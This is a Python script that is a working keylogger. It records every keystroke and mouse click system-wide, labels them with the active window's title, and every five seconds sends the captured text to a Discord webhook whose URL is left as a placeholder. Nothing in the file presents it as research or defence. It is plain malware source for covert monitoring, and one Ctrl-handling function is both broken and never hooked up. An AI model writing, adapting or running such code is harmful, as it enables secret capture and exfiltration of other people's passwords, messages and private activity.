import keyboard
import time
import requests
import threading
from pynput.mouse import Listener as MouseListener
from queue import Queue
import pygetwindow as gw

# Replace 'WEBHOOK_URL' with your actual Discord webhook URL
WEBHOOK_URL = 'urwebhook'

# Create a queue to store the captured events (keys and mouse clicks) with timestamps
event_queue = Queue()

# Variable to store the last active window title and current window title for associating events with windows
last_active_window_title = None
current_window_title = None
current_window_keys = ""

# Function to send events to Discord via webhook
# Function to send events to Discord via webhook
def send_events():
    global event_queue, current_window_keys, current_window_title

    while True:
        if current_window_keys and current_window_title:
            event_queue.put(f'**{current_window_title}:**\n```{current_window_keys}```')
            current_window_keys = ""

        if not event_queue.empty():
            events_to_send = []
            while not event_queue.empty():
                events_to_send.append(event_queue.get())

            payload = {
                'content': '\n'.join(events_to_send)
            }

            # Send the payload to the Discord webhook
            requests.post(WEBHOOK_URL, data=payload)

        time.sleep(5)  # Send events every 5 seconds


# Function to capture keystrokes
def capture_keystrokes(event):
    global current_window_title, current_window_keys

    if event.event_type == keyboard.KEY_DOWN:
        if event.name == 'ctrl':
            return  # Ctrl is handled separately
        elif event.name == 'shift':
            current_window_keys += 'Shift '
        elif event.name == 'alt':
            current_window_keys += 'Alt '
        elif event.name == 'space':
            current_window_keys += ' '
        else:
            current_window_keys += event.name

        # Record the current window title for associating events
        current_window_title = get_active_window_title()

    elif event.event_type == keyboard.KEY_UP:
        if event.name == 'ctrl':
            return  # Ctrl is handled separately
        elif event.name == 'shift' or event.name == 'alt':
            # No need to handle key-up events for Shift and Alt
            pass
        elif event.name == 'space':
            pass  # Space is already handled in KEY_DOWN
        else:
            # Key-up event for normal keys
            pass

# Function to capture keys when Ctrl is pressed
def capture_ctrl_pressed(event):
    if event.event_type == keyboard.KEY_DOWN and event.name.isalpha():
        current_window_keys += 'Ctrl+' + event.name

# Function to capture mouse clicks
def capture_clicks(x, y, button, pressed):
    if pressed:
        event_queue.put(f'**Mouse {button}**')

# Function to get the active window title
def get_active_window_title():
    active_window = gw.getActiveWindow()
    if active_window is not None:
        return active_window.title
    else:
        return None

# Start capturing keystrokes
keyboard.on_press(callback=capture_keystrokes)

# Start capturing mouse clicks
mouse_listener = MouseListener(on_click=capture_clicks)
mouse_listener.start()

# Start a thread to send events to Discord
threading.Thread(target=send_events, daemon=True).start()

# Keep the script running
while True:
    time.sleep(1)
